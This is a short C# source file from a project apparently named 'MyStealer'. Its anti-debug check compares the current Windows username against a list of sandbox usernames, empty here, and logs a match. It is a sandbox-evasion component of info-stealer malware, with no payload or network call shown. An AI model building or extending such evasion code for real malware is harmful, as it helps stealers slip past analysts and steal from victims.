using System;

namespace MyStealer.AntiDebug.Check
{
    internal class UserName : CheckBase
    {
        public override string Name => "UserName";

        private readonly string[] userNames = new string[]
        {
        };

        public override bool CheckActive()
        {
            foreach (var name in userNames)
            {
                if (string.Equals(Environment.UserName, name, StringComparison.OrdinalIgnoreCase))
                {
                    Logger.Information("Bad username: {name}", name);
                    return true;
                }
            }

            return false;
        }
    }
}
